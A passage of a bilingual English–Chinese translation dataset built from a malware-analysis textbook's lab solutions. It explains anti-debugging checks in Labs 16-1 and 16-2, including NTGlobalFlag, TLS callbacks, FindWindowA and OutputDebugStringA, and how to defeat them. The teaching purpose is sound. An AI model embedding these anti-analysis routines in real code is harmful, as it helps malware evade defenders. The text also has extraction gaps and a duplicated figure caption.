- en: '*In WinDbg, you can start a program with the debug heap disabled by using the
    –hd* *option, which causes the ForceFlags field to always be 0\. For example,
    the command* *windbg –hd Lab16-01.exe creates heaps in normal mode, rather than
    in debug mode.*'
  id: totrans-5496
  prefs: []
  type: TYPE_NORMAL
  zh: '*在 WinDbg 中，您可以使用 –hd 选项启动程序以禁用调试堆，这将导致 ForceFlags 字段始终为 0。例如，命令 *windbg –hd
    Lab16-01.exe 以正常模式创建堆，而不是以调试模式。*'
- en: '**The NTGlobalFlag Flag**'
  id: totrans-5497
  prefs: []
  type: TYPE_NORMAL
  zh: '**NTGlobalFlag 标志**'
- en: The code in the lower box of Figure 16-1L is shown in Listing 16-4L.
  id: totrans-5498
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16-1L 的下方框中的代码显示在列表 16-4L 中。
- en: 00403594 mov eax, large fs:30h 
  id: totrans-5499
  prefs: []
  type: TYPE_NORMAL
  zh: 00403594 mov eax, large fs:30h 
- en: 0040359A db 3Eh 
  id: totrans-5500
  prefs: []
  type: TYPE_NORMAL
  zh: 0040359A db 3Eh 
- en: 0040359A mov eax, [eax+68h] 
  id: totrans-5501
  prefs: []
  type: TYPE_NORMAL
  zh: 0040359A mov eax, [eax+68h] 
- en: 0040359E sub eax, 70h
  id: totrans-5502
  prefs: []
  type: TYPE_NORMAL
  zh: 0040359E sub eax, 70h
- en: Solutions to Labs
  id: totrans-5503
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**659**'
  id: totrans-5504
  prefs: []
  type: TYPE_NORMAL
  zh: '**659**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5505
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004035A1 mov [ebp+var_1828], eax 004035A7 cmp [ebp+var_1828], 0
  id: totrans-5506
  prefs: []
  type: TYPE_NORMAL
  zh: 004035A1 mov [ebp+var_1828], eax 004035A7 cmp [ebp+var_1828], 0
- en: 004035AE jnz short loc_4035B5
  id: totrans-5507
  prefs: []
  type: TYPE_NORMAL
  zh: 004035AE jnz short loc_4035B5
- en: 004035B0 call sub_401000
  id: totrans-5508
  prefs: []
  type: TYPE_NORMAL
  zh: 004035B0 call sub_401000
- en: '*Listing 16-4L: Checking the NTGlobalFlag flag*'
  id: totrans-5509
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 16-4L：检查 NTGlobalFlag 标志*'
- en: The PEB structure is loaded into EAX at  using fs:[30], and NTGlobalFlag is
    accessed and moved into EAX at . NTGlobalFlag is compared to 0x70, and a decision
    is made whether to call sub_401000 (the terminate and remove function) or to continue
    executing normally. The erroneous db 3Eh added by IDA Pro is seen at , and we
    ignore it.
  id: totrans-5510
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 fs:[30] 将 PEB 结构加载到 EAX 中，然后访问 NTGlobalFlag 并将其移动到 EAX 中。NTGlobalFlag 与
    0x70 进行比较，并做出是否调用 sub_401000（终止并删除函数）或继续正常执行的决策。由 IDA Pro 添加的错误 db 3Eh 指令在处可见，我们忽略它。
- en: The NTGlobalFlag flag at offset 0x68 in the PEB structure is set to 0x70 when
    the process is run in a debugger. As with the other flags we’ve discussed, we
    need to set this byte to 0, either manually or by using an OllyDbg plug-in.
  id: totrans-5511
  prefs: []
  type: TYPE_NORMAL
  zh: 在 PEB 结构的偏移量 0x68 处的 NTGlobalFlag 标志，当进程在调试器中运行时被设置为 0x70。与其他我们讨论过的标志一样，我们需要将这个字节设置为
    0，无论是手动操作还是通过使用 OllyDbg 插件。
- en: 'To set NTGlobalFlag manually, launch the Command Line plug-in by selecting
    **Plugins****Command Line**, and then enter the following command in the window:'
  id: totrans-5512
  prefs: []
  type: TYPE_NORMAL
  zh: 要手动设置NTGlobalFlag，请通过选择**插件****命令行**启动命令行插件，然后在窗口中输入以下命令：
- en: dump fs:[30] + 0x68
  id: totrans-5513
  prefs: []
  type: TYPE_NORMAL
  zh: dump fs:[30] + 0x68
- en: This dumps the NTGlobalFlag flag into the dump window. As with the BeingDebugged
    flag, select the byte, right-click, and select **Binary****Fill With** **00’s**
    to set the byte to 0\.
  id: totrans-5514
  prefs: []
  type: TYPE_NORMAL
  zh: 这会将NTGlobalFlag标志放入转储窗口。与BeingDebugged标志一样，选择字节，右键单击，然后选择**二进制****填充为** **00’s**
    以将字节设置为0\。
- en: You can use also the OllyDbg plug-in PhantOm to protect yourself from the NTGlobalFlag
    anti-debugging technique without the need to modify any settings.
  id: totrans-5515
  prefs: []
  type: TYPE_NORMAL
  zh: 您还可以使用OllyDbg插件PhantOm来保护自己免受NTGlobalFlag反调试技术的侵害，而无需修改任何设置。
- en: '**Summary**'
  id: totrans-5516
  prefs: []
  type: TYPE_NORMAL
  zh: '**总结**'
- en: Lab 16-1 uses three different anti-debugging techniques to attempt to thwart
    debugger analysis. The malware manually checks structures for telltale signs of
    debugger usage and performs the same three checks at the start of nearly every
    subroutine, which makes flipping single jump flags tedious when inside a debugger.
    As you’ve seen, the easiest way to defeat the malware is to change the structures
    in memory so that the check fails, and you can make this change either manually
    or with the PhantOm plug-in for OllyDbg.
  id: totrans-5517
  prefs: []
  type: TYPE_NORMAL
  zh: Lab 16-1使用三种不同的反调试技术来尝试阻止调试器分析。恶意软件手动检查结构以寻找调试器使用的迹象，并在几乎所有子例程的开始处执行相同的三个检查，这使得在调试器内部翻转单跳标志变得繁琐。如您所见，击败恶意软件的最简单方法是更改内存中的结构，使检查失败，您可以通过手动更改或使用OllyDbg的PhantOm插件来完成此更改。
- en: '**Lab 16-2 Solutions**'
  id: totrans-5518
  prefs: []
  type: TYPE_NORMAL
  zh: '**16-2实验解决方案**'
- en: '***Short Answers***'
  id: totrans-5519
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-5520
  prefs: []
  type: TYPE_NORMAL
  zh: 1\。
- en: When you run *Lab16-02.exe* from the command line, it prints a usage string
    asking for a four-character password.
  id: totrans-5521
  prefs: []
  type: TYPE_NORMAL
  zh: 当您从命令行运行*Lab16-02.exe*时，它打印出一个使用字符串，要求输入一个四字符密码。
- en: 2\.
  id: totrans-5522
  prefs: []
  type: TYPE_NORMAL
  zh: 2\。
- en: If you input an incorrect password, the program will respond “Incorrect password,
    Try again.”
  id: totrans-5523
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您输入了错误的密码，程序将响应“密码错误，请重试。”
- en: '**660**'
  id: totrans-5524
  prefs: []
  type: TYPE_NORMAL
  zh: '**660**'
- en: Appendix C
  id: totrans-5525
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5526
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 3\.
  id: totrans-5527
  prefs: []
  type: TYPE_NORMAL
  zh: 3\。
- en: The correct command-line password is byrr.
  id: totrans-5528
  prefs: []
  type: TYPE_NORMAL
  zh: 正确的命令行密码是byrr。
- en: 4\.
  id: totrans-5529
  prefs: []
  type: TYPE_NORMAL
  zh: 4\。
- en: The strncmp function is called at 0x40123A.
  id: totrans-5530
  prefs: []
  type: TYPE_NORMAL
  zh: strncmp函数在0x40123A处被调用。
- en: 5\.
  id: totrans-5531
  prefs: []
  type: TYPE_NORMAL
  zh: 5\。
- en: The program immediately terminates when loaded into OllyDbg using the default
    settings.
  id: totrans-5532
  prefs: []
  type: TYPE_NORMAL
  zh: 使用默认设置将程序加载到OllyDbg中时，程序会立即终止。
- en: 6\.
  id: totrans-5533
  prefs: []
  type: TYPE_NORMAL
  zh: 6\。
- en: The program contains a .tls section.
  id: totrans-5534
  prefs: []
  type: TYPE_NORMAL
  zh: 程序包含一个.tls部分。
- en: 7\.
  id: totrans-5535
  prefs: []
  type: TYPE_NORMAL
  zh: 7\。
- en: The TLS callback starts at 0x401060\.
  id: totrans-5536
  prefs: []
  type: TYPE_NORMAL
  zh: TLS回调从0x401060开始\。
- en: 8\.
  id: totrans-5537
  prefs: []
  type: TYPE_NORMAL
  zh: 8\。
- en: The FindWindowA function is used to terminate the malware. It looks for a window
    with the class name OLLYDBG and terminates the program if it is found. You can
    change the window class name using an OllyDbg plug-in like PhantOm, or NOP-out
    the call to exit at 0x40107C.
  id: totrans-5538
  prefs: []
  type: TYPE_NORMAL
  zh: FindWindowA函数用于终止恶意软件。它寻找具有类名OLLYDBG的窗口，如果找到，则终止程序。您可以使用PhantOm等OllyDbg插件更改窗口类名，或者通过在0x40107C处的退出调用中NOP-out来更改它。
- en: 9\.
  id: totrans-5539
  prefs: []
  type: TYPE_NORMAL
  zh: 9\。
- en: At first, the password appears to be bzqr when you set a breakpoint at the strncmp
    call.
  id: totrans-5540
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，当您在strncmp调用处设置断点时，密码看起来像是bzqr。
- en: 10\. This password found in the debugger doesn’t work on the command line.
  id: totrans-5541
  prefs: []
  type: TYPE_NORMAL
  zh: 10\. 在调试器中找到的此密码在命令行中不起作用。
- en: 11\. The result of OutputDebugStringA and the BeingDebugged flag are used as
    inputs to the decoding algorithm. You can use the PhantOm plug-in to ensure that
    the BeingDebugged flag is 0, and you can NOP-out the add instruction at 0x401051\.
  id: totrans-5542
  prefs: []
  type: TYPE_NORMAL
  zh: 11\. OutputDebugStringA的结果和BeingDebugged标志被用作解码算法的输入。您可以使用PhantOm插件确保BeingDebugged标志为0，并且您可以在0x401051处的add指令中NOP-out。
- en: '***Detailed Analysis***'
  id: totrans-5543
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: 'We first run the program from the command line and see the following printed
    to the screen:'
  id: totrans-5544
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先从命令行运行程序，并看到以下内容打印到屏幕上：
- en: 'usage: Lab16-02.exe <4 character password>'
  id: totrans-5545
  prefs: []
  type: TYPE_NORMAL
  zh: 使用方法：Lab16-02.exe <4字符密码>
- en: 'The program is expecting a four-character password. Next, we attempt to provide
    the password abcd on the command line, and get the following output: Incorrect
    password, Try again.'
  id: totrans-5546
  prefs: []
  type: TYPE_NORMAL
  zh: 程序期望一个四字符密码。接下来，我们尝试在命令行中提供密码abcd，并得到以下输出：密码错误，请重试。
- en: Now, we look for a string comparison in the code so we can run the program in
    a debugger and set a breakpoint at the string comparison in order to **1 6**
  id: totrans-5547
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们寻找代码中的字符串比较，以便我们可以在调试器中运行程序，并在字符串比较处设置断点以**1 6**
- en: see the password. The fourth Lab 16-2 question hinted that strncmp is used.
  id: totrans-5548
  prefs: []
  type: TYPE_NORMAL
  zh: 查看密码。第16-2题的提示表明使用了strncmp。
- en: If we load the program into IDA Pro, we see strncmp in the main function at
    0x40123A. Let’s load the program into OllyDbg and set a breakpoint at 0x40123A.
  id: totrans-5549
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们将程序加载到IDA Pro中，我们会看到在0x40123A的主函数中的strncmp。让我们将程序加载到OllyDbg中，并在0x40123A处设置一个断点。
- en: After we load *Lab16-02.exe* into OllyDbg, it immediately terminates without
    pausing the program. We suspect something is amiss, so we check the PE
  id: totrans-5550
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们将*Lab16-02.exe*加载到OllyDbg后，它立即终止而不会暂停程序。我们怀疑有问题，因此我们检查PE
- en: file structure. Figure 16-4L shows the PE header section names in PEview.
  id: totrans-5551
  prefs: []
  type: TYPE_NORMAL
  zh: 文件结构。图16-4L显示了PEview中的PE头部部分名称。
- en: Solutions to Labs
  id: totrans-5552
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**661**'
  id: totrans-5553
  prefs: []
  type: TYPE_NORMAL
  zh: '**661**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5554
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 150](index-695_1.png)'
  id: totrans-5555
  prefs: []
  type: TYPE_IMG
  zh: '![图像150](index-695_1.png)'
- en: '![Image 151](index-695_2.png)'
  id: totrans-5556
  prefs: []
  type: TYPE_IMG
  zh: '![图像151](index-695_2.png)'
- en: '*Figure 16-4L: PEview displaying a TLS section for Lab 16-2*'
  id: totrans-5557
  prefs: []
  type: TYPE_NORMAL
  zh: '*图16-4L：PEview显示Lab 16-2的TLS部分*'
- en: The TLS section contains callback functions that gain execution and prematurely
    terminate the program in OllyDbg. In IDA Pro, press CTRL-E to see the location
    of all entry points for the program, as shown in Figure 16-5L.
  id: totrans-5558
  prefs: []
  type: TYPE_NORMAL
  zh: TLS部分包含回调函数，这些函数在OllyDbg中获取执行并提前终止程序。在IDA Pro中，按CTRL-E以查看程序所有入口点的位置，如图16-5L所示。
- en: '*Figure 16-5L: PEview displaying a TLS section for Lab 16-2*'
  id: totrans-5559
  prefs: []
  type: TYPE_NORMAL
  zh: '*图16-5L：PEview显示Lab 16-2的TLS部分*'
- en: Double-click the TLS callback function at 0x401060 to navigate directly to the
    function and see if there is any anti-debugging functionality. Listing 16-5L
  id: totrans-5560
  prefs: []
  type: TYPE_NORMAL
  zh: 双击0x401060处的TLS回调函数以直接导航到该函数并查看是否存在任何反调试功能。列表16-5L
- en: shows the TLS callback code.
  id: totrans-5561
  prefs: []
  type: TYPE_NORMAL
  zh: 显示了TLS回调代码。
- en: 00401063 cmp [ebp+arg_4], 1
  id: totrans-5562
  prefs: []
  type: TYPE_NORMAL
  zh: 00401063 cmp [ebp+arg_4], 1
- en: 00401067 jnz short loc_401081
  id: totrans-5563
  prefs: []
  type: TYPE_NORMAL
  zh: 00401067 jnz short loc_401081
- en: 00401069 push 0 ; lpWindowName 0040106B push offset ClassName ; "OLLYDBG"
  id: totrans-5564
  prefs: []
  type: TYPE_NORMAL
  zh: 00401069 push 0 ; lpWindowName 0040106B push offset ClassName ; "OLLYDBG"
- en: 00401070 call ds:FindWindowA 
  id: totrans-5565
  prefs: []
  type: TYPE_NORMAL
  zh: 00401070 call ds:FindWindowA 
- en: 00401076 test eax, eax
  id: totrans-5566
  prefs: []
  type: TYPE_NORMAL
  zh: 00401076 test eax, eax
- en: 00401078 jz short loc_401081
  id: totrans-5567
  prefs: []
  type: TYPE_NORMAL
  zh: 00401078 jz short loc_401081
- en: 0040107A push 0 ; int
  id: totrans-5568
  prefs: []
  type: TYPE_NORMAL
  zh: 0040107A push 0 ; int
- en: 0040107C call _exit 
  id: totrans-5569
  prefs: []
  type: TYPE_NORMAL
  zh: 0040107C call _exit 
- en: '*Listing 16-5L: FindWindowA check for system residue of OllyDbg* The TLS callback
    starts with a comparison of arg_4 to 1 to determine whether the TLS callback is
    being called as a result of the process starting up.'
  id: totrans-5570
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表16-5L：FindWindowA检查OllyDbg的系统残留* TLS回调从将arg_4与1进行比较开始，以确定TLS回调是否是作为进程启动的结果而被调用的。'
- en: (TLS callback functions are called at different times by the system.) In other
    words, this anti-debugging technique executes only during program startup.
  id: totrans-5571
  prefs: []
  type: TYPE_NORMAL
  zh: （TLS回调函数由系统在不同的时间调用。）换句话说，这种反调试技术仅在程序启动期间执行。
- en: At , the callback calls the FindWindowA function with the class name OLLYDBG.
    This call makes it easy for the malware to see if OllyDbg is running **662**
  id: totrans-5572
  prefs: []
  type: TYPE_NORMAL
  zh: 在处，回调调用FindWindowA函数，使用类名OLLYDBG。这个调用使得恶意软件能够轻松地查看OllyDbg是否正在运行**662**
- en: Appendix C
  id: totrans-5573
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5574
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: with its default window name. If FindWindowA finds the window, it returns a
    nonzero value, which will cause the exit function to terminate the program at
    .
  id: totrans-5575
  prefs: []
  type: TYPE_NORMAL
  zh: 使用其默认窗口名称。如果FindWindowA找到窗口，它将返回一个非零值，这将导致退出函数在处终止程序。
- en: To disable this technique, NOP-out the call to exit at , or use the PhantOm
    plug-in for OllyDbg as discussed in the previous lab. (Figure 16-3L
  id: totrans-5576
  prefs: []
  type: TYPE_NORMAL
  zh: 要禁用此技术，请在处NOP掉退出调用，或使用前一个实验中讨论的OllyDbg的PhantOm插件。（图16-3L
- en: displays the options for the PhantOm plug-in.) If you’re using the PhantOm plug-in,
    check the **Load Driver** and **Hide OllyDbg Windows** boxes to protect against
    this technique.
  id: totrans-5577
  prefs: []
  type: TYPE_NORMAL
  zh: 显示了PhantOm插件的选项。)如果您正在使用PhantOm插件，请勾选**加载驱动程序**和**隐藏OllyDbg窗口**复选框以防止此技术。
- en: Now load the program into OllyDbg, set a breakpoint at the strncmp call at 0x40123A,
    and add a command-line argument of abcd in OllyDbg before clicking the play button.
    When you click play, the strncmp function appears to compare abcd to bzqrp@ss;
    however, strncmp checks only the first 4 bytes of the bzqrp@ss string. We conclude
    that the password must be bzqr, but if we try that password on the command line
    outside a debugger, we receive the incorrect password error message. We dig deeper
    into the code to determine if something else is going on.
  id: totrans-5578
  prefs: []
  type: TYPE_NORMAL
  zh: 现在将程序加载到OllyDbg中，在0x40123A处的strncmp调用处设置一个断点，并在点击播放按钮之前在OllyDbg中添加一个命令行参数abcd。当您点击播放时，strncmp函数看起来是在比较abcd和bzqrp@ss；然而，strncmp只检查bzqrp@ss字符串的前4个字节。我们得出结论，密码必须是bzqr，但如果我们尝试这个密码在调试器外部的命令行中，我们会收到密码错误信息。我们进一步深入代码以确定是否还有其他问题。
- en: We begin by properly labeling the encoded string in the listing. The second
    parameter passed on the stack to strncmp is byte_408030 (a global variable), which
    we know to be a byte array of size 4\. We change this into a 4-byte array and
    rename it encoded_password.
  id: totrans-5579
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先在列表中正确标记编码字符串。传递给 strncmp 的堆栈上的第二个参数是 byte_408030（一个全局变量），我们知道它是一个大小为 4
    的字节数组。我们将它改为一个 4 字节数组，并将其重命名为 encoded_password。
- en: Next, we see CreateThread called just before the call to strncmp in the main
    function. To look at the code in the thread created by this call, double-click
    the parameter labeled StartAddress. This function appears to be a decoding routine
    since it contains many logical and shift operations on encoded_password.
  id: totrans-5580
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们看到在主函数中调用 strncmp 之前调用了 CreateThread。要查看由此调用创建的线程中的代码，请双击标记为 StartAddress
    的参数。这个函数看起来像是一个解码例程，因为它在 encoded_password 上包含许多逻辑和移位操作。
- en: Examining the decoding routine closely, we see the BeingDebugged flag accessed,
    as shown in Listing 16-6L at  and .
  id: totrans-5581
  prefs: []
  type: TYPE_NORMAL
  zh: 仔细检查解码例程，我们看到访问了 BeingDebugged 标志，如列表 16-6L 中的  和  所示。
- en: 00401124 ror encoded_password+2, 7
  id: totrans-5582
  prefs: []
  type: TYPE_NORMAL
  zh: 00401124 ror encoded_password+2, 7
- en: 0040112B mov ebx, large fs:30h 
  id: totrans-5583
  prefs: []
  type: TYPE_NORMAL
  zh: 0040112B mov ebx, large fs:30h 
- en: 00401132 xor encoded_password+3, 0C5h
  id: totrans-5584
  prefs: []
  type: TYPE_NORMAL
  zh: 00401132 xor encoded_password+3, 0C5h
- en: '...'
  id: totrans-5585
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 0040117D rol encoded_password, 6
  id: totrans-5586
  prefs: []
  type: TYPE_NORMAL
  zh: 0040117D rol encoded_password, 6
- en: 00401184 xor encoded_password, 72h
  id: totrans-5587
  prefs: []
  type: TYPE_NORMAL
  zh: 00401184 xor encoded_password, 72h
- en: 0040118B mov bl, [ebx+2] 
  id: totrans-5588
  prefs: []
  type: TYPE_NORMAL
  zh: 0040118B mov bl, [ebx+2] 
- en: '**1 6**'
  id: totrans-5589
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 6**'
- en: 0040118E rol encoded_password+1, 1
  id: totrans-5590
  prefs: []
  type: TYPE_NORMAL
  zh: 0040118E rol encoded_password+1, 1
- en: '...'
  id: totrans-5591
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 004011A2 add encoded_password+2, bl 
  id: totrans-5592
  prefs: []
  type: TYPE_NORMAL
  zh: 004011A2 add encoded_password+2, bl 
- en: '*Listing 16-6L: Decoding routine incorporating anti-debugging in its decoding*
    The PEB structure is loaded into EBX at , and then the BeingDebugged flag is
    moved into BL at . BL is then used at  to modify the password. The easiest way
    to prevent the program from using this technique is to ensure that the BeingDebugged
    flag is 0, which can be set either manually or with the PhantOm plug-in for OllyDbg,
    as discussed in the previous lab.'
  id: totrans-5593
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 16-6L：解码例程中包含解码过程中的反调试功能* PEB 结构被加载到 EBX 中 ，然后 BeingDebugged 标志被移动到 BL
    中 。BL 然后在  处用于修改密码。防止程序使用此技术的最简单方法确保 BeingDebugged 标志为 0，这可以通过手动设置或使用 OllyDbg
    的 PhantOm 插件来实现，如前一个实验中所述。'
- en: We load the program into OllyDbg again and break at the strncmp call at 0x40123A.
    This time, the password appears to be bzrr. But when we try this password on the
    command line, we receive the incorrect password error message again.
  id: totrans-5594
  prefs: []
  type: TYPE_NORMAL
  zh: 我们再次将程序加载到 OllyDbg 中，并在 0x40123A 的 strncmp 调用处设置断点。这次，密码看起来像是 bzrr。但当我们尝试在命令行上使用此密码时，我们再次收到密码错误信息。
- en: Solutions to Labs
  id: totrans-5595
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**663**'
  id: totrans-5596
  prefs: []
  type: TYPE_NORMAL
  zh: '**663**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5597
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Returning to the decoding routine, we see that it uses a global variable, byte_40A968,
    as shown in Listing 16-7L.
  id: totrans-5598
  prefs: []
  type: TYPE_NORMAL
  zh: 返回解码例程，我们看到它使用了一个全局变量，byte_40A968，如列表 16-7L 所示。
- en: 0040109B mov bl, byte_40A968 
  id: totrans-5599
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109B mov bl, byte_40A968 
- en: 004010A1 or al, 1
  id: totrans-5600
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A1 or al, 1
- en: '...'
  id: totrans-5601
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 0040110A rol encoded_password, 2
  id: totrans-5602
  prefs: []
  type: TYPE_NORMAL
  zh: 0040110A rol encoded_password, 2
- en: 00401111 add encoded_password+1, bl 
  id: totrans-5603
  prefs: []
  type: TYPE_NORMAL
  zh: 00401111 add encoded_password+1, bl 
- en: '*Listing 16-7L: Global byte_40A968 used in the password decoding* At , byte_40A968
    is moved into BL, and BL is used in the decoding code, as seen at . Double-clicking
    byte_40A968, we see that it is initialized to 0, but it has a cross-reference
    to sub_401020\. That function is shown in Listing 16-8L.'
  id: totrans-5604
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 16-7L：在密码解码中使用的全局 byte_40A968* 在  处，byte_40A968 被移动到 BL 中，BL 被用于解码代码，如
     处所示。双击 byte_40A968，我们看到它被初始化为 0，但它有一个到 sub_401020 的交叉引用。该函数在列表 16-8L 中显示。'
- en: 00401024 mov [ebp+dwErrCode], 3039h
  id: totrans-5605
  prefs: []
  type: TYPE_NORMAL
  zh: 00401024 mov [ebp+dwErrCode], 3039h
- en: 0040102B mov eax, [ebp+dwErrCode]
  id: totrans-5606
  prefs: []
  type: TYPE_NORMAL
  zh: 0040102B mov eax, [ebp+dwErrCode]
- en: 0040102E push eax ; dwErrCode 0040102F call ds:SetLastError 
  id: totrans-5607
  prefs: []
  type: TYPE_NORMAL
  zh: 0040102E push eax ; dwErrCode 0040102F call ds:SetLastError 
- en: 00401035 push offset OutputString ; "b"
  id: totrans-5608
  prefs: []
  type: TYPE_NORMAL
  zh: 00401035 push offset OutputString ; "b"
- en: 0040103A call ds:OutputDebugStringA 
  id: totrans-5609
  prefs: []
  type: TYPE_NORMAL
  zh: 0040103A call ds:OutputDebugStringA 
- en: 00401040 call ds:GetLastError
  id: totrans-5610
  prefs: []
  type: TYPE_NORMAL
  zh: 00401040 call ds:GetLastError
- en: 00401046 cmp eax, [ebp+dwErrCode] 
  id: totrans-5611
  prefs: []
  type: TYPE_NORMAL
  zh: 00401046 cmp eax, [ebp+dwErrCode] 
- en: 00401049 jnz short loc_40105A
  id: totrans-5612
  prefs: []
  type: TYPE_NORMAL
  zh: 00401049 jnz short loc_40105A
- en: 0040104B mov cl, byte_40A968
  id: totrans-5613
  prefs: []
  type: TYPE_NORMAL
  zh: 0040104B mov cl, byte_40A968
- en: 00401051 add cl, 1 
  id: totrans-5614
  prefs: []
  type: TYPE_NORMAL
  zh: 00401051 add cl, 1 
- en: 00401054 mov byte_40A968, cl
  id: totrans-5615
  prefs: []
  type: TYPE_NORMAL
  zh: 00401054 mov byte_40A968, cl
- en: '*Listing 16-8L: OutputDebugStringA anti-debugging technique* At , OutputDebugStringA
    is called, which sends a string (in this case, "b") to a debugger for display.
    If there is no debugger attached, an error code is set. At , SetLastError sets
    the error code to 0x3039, and the function checks to see if that error is still
    present with the comparison at . The error code changes if the program is running
    outside a debugger; therefore, the comparison will set the zero flag if the error
    code has not changed (running in a debugger). If this check is successful, the
    code increments byte_40A968 by 1'
  id: totrans-5616
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 16-8L：OutputDebugStringA 反调试技术* 在 ，OutputDebugStringA 被调用，将一个字符串（在这种情况下，"b"）发送到调试器进行显示。如果没有附加调试器，则设置错误代码。在
    ，SetLastError 将错误代码设置为 0x3039，函数通过  的比较检查该错误是否仍然存在。如果程序在调试器外运行，错误代码会改变；因此，如果错误代码没有改变（在调试器中运行），比较将设置零标志。如果这个检查成功，代码将
    byte_40A968 的字节增加 1'
- en: at . The easiest way to defeat this technique is to NOP-out the add instruction
    at .
  id: totrans-5617
  prefs: []
  type: TYPE_NORMAL
  zh: 在 . 打败这种技术的最简单方法是在  处 NOP 出加法指令。
- en: Next, we want to track down how the function from Listing 16-8L
  id: totrans-5618
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们想要追踪列表 16-8L
- en: (sub_401020) is called. We check the cross-reference and see that sub_401020
  id: totrans-5619
  prefs: []
  type: TYPE_NORMAL
  zh: (sub_401020) 被调用。我们检查交叉引用并看到 sub_401020
- en: is called from the TLS callback, as shown in Listing 16-9L (in bold).
  id: totrans-5620
  prefs: []
  type: TYPE_NORMAL
  zh: 是从 TLS 回调中调用的，如列表 16-9L（粗体所示）。
- en: 00401081 cmp [ebp+arg_4], 2
  id: totrans-5621
  prefs: []
  type: TYPE_NORMAL
  zh: 00401081 cmp [ebp+arg_4], 2
- en: 00401085 jnz short loc_40108C
  id: totrans-5622
  prefs: []
  type: TYPE_NORMAL
  zh: 00401085 jnz short loc_40108C
- en: 00401087 call **sub_401020**
  id: totrans-5623
  prefs: []
  type: TYPE_NORMAL
  zh: 00401087 call **sub_401020**
- en: '*Listing 16-9L: The check and call from within the TLS callback* **664**'
  id: totrans-5624
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 16-9L：TLS 回调内的检查和调用** **664**'
- en: Appendix C
  id: totrans-5625
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5626
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The code in Listing 16-9L starts by comparing arg_4 to the number 2\.
  id: totrans-5627
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 16-9L 中的代码首先比较 arg_4 与数字 2。
- en: 'Recall from our earlier discussion that arg_4 to the TLS callback is used to
    determine when the TLS callback is made: 1 is used for when the process is starting
    up, 2 for when a thread is starting up, and 3 when the process is being terminated.
    Therefore, this TLS callback was called again when the CreateThread executed and
    caused the OutputDebugStringA to execute.'
  id: totrans-5628
  prefs: []
  type: TYPE_NORMAL
  zh: 回想我们之前的讨论，TLS 回调中的 arg_4 用于确定 TLS 回调何时被调用：1 用于进程启动时，2 用于线程启动时，3 用于进程终止时。因此，当
    CreateThread 执行并导致 OutputDebugStringA 执行时，这个 TLS 回调再次被调用。
- en: '**Getting the Correct Password**'
  id: totrans-5629
  prefs: []
  type: TYPE_NORMAL
  zh: '**获取正确密码**'
- en: To finally get the password, we start with our OllyDbg PhantOm plug-in installed
    and set up to protect us from the BeingDebugged flag check and the FindWindow
    check. We load the program into OllyDbg, NOP-out the add instruction at 0x401051,
    and set a breakpoint at the strncmp call (0x40123A).
  id: totrans-5630
  prefs: []
  type: TYPE_NORMAL
  zh: 为了最终获取密码，我们首先安装并设置 OllyDbg PhantOm 插件，以保护我们免受 BeingDebugged 标志检查和 FindWindow
    检查。我们将程序加载到 OllyDbg 中，NOP 出 0x401051 处的加法指令，并在 strncmp 调用（0x40123A）处设置断点。
- en: 'This time, the password appears to be byrr. Trying this on the command line,
    we get the following message:'
  id: totrans-5631
  prefs: []
  type: TYPE_NORMAL
  zh: 这次，密码看起来是 byrr。在命令行尝试这个密码，我们得到以下消息：
- en: You entered the correct password!
  id: totrans-5632
  prefs: []
  type: TYPE_NORMAL
  zh: 你输入了正确的密码！
- en: '**Lab 16-3 Solutions**'
  id: totrans-5633
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验室 16-3 解决方案**'
- en: '***Short Answers***'
  id: totrans-5634
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
